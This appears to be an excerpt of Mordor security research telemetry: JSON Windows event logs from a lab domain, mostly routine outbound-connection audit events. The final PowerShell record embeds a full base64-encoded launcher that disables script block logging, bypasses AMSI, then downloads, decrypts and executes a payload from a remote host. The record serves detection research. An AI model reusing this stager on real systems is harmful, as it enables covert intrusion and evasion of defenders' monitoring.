{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49685","FilterRTID":"69279","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t49685\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69279\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.026Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":4572,"RecordNumber":9020810}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.026Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":4572,"RecordNumber":9020811}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.027Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":4572,"RecordNumber":9020812}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.027Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":4572,"RecordNumber":9020813}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.027Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":4572,"RecordNumber":9020814}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"63406","FilterRTID":"69282","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3732","DestAddress":"168.63.129.16","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3732\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windowsazure\\packages\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t63406\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t32526\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t69282\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.027Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:52","Severity":"INFO","EventID":5156,"DestPort":"32526","ThreadID":4572,"RecordNumber":9020815}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"49682","FilterRTID":"72497","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:18:54","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.5","ProcessId":"3432","DestAddress":"169.254.169.254","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3432\r\n\tApplication Name:\t\\device\\harddiskvolume4\\packages\\plugins\\microsoft.azure.networkwatcher.networkwatcheragentwindows\\1.4.1587.1\\networkwatcheragent\\networkwatcheragent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.38.5\r\n\tSource Port:\t\t49682\r\n\tDestination Address:\t169.254.169.254\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t72497\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:54.027Z","LayerRTID":"48","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:53","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":4572,"RecordNumber":9020816}
{"Task":8,"EventReceivedTime":"2020-07-22 00:18:54","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11266\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:18:54.028Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:53","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8977}
